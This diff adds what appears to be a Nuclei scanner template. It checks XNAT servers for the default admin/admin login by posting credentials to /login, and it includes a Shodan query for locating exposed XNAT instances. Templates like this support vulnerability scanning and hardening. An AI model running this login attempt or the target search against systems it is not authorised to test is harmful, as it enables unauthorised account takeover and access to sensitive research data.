@@ -1,0 +1,51 @@
+id: xnat-default-login
+
+info:
+  name: XNAT - Default Login
+  author: 0x_Akoko
+  severity: high
+  description: XNAT contains an admin default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://wiki.xnat.org/documentation/xnat-administration/xnat-setup-first-time-configuration#:~:text=Log%20in%20with%20the%20username%20admin%20and%20password%20admin
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:xnat:xnat:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.title:"XNAT"
+    product: xnat
+    vendor: xnat
+  tags: default-login,xnat
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "app/template/Index.vm?login=true"
+          - "JSESSIONID"
+        condition: and
+
+      - type: status
+        status:
+          - 302
+# digest: 490a00463044022041d2d199064db48a2732d65383dac932e516caf5b754ef38dcc517061fd18ef60220491d5dc8c1ebf52920089305f5c865952d40bf21b3630fb038bd3fcce2fdcca2:922c64590222798bb761d5b6d8e72950
